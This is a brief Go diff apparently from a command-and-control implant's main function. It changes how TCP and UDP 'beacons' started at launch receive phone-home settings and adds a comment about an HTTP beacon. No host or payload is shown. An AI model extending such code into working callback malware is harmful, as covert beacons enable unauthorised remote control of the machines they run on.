@@ -73,10 +73,11 @@ func main() {
 	if Core.BEACON_ON_START == true {
 		switch Core.BACON_TYPE {
 		case "tcp":
-			go Beacons.BaconTCP()
+			go Beacons.BaconTCP(Core.PHONEHOME_TCP)
 		case "udp":
-			go Beacons.BeaconUDP()
+			go Beacons.BeaconUDP(Core.PHONEHOME_UDP)
 		case "http":
+			// function to call other beacons depending on second param
 			go Beacons.BeaconHTTP()
 		}
 	}
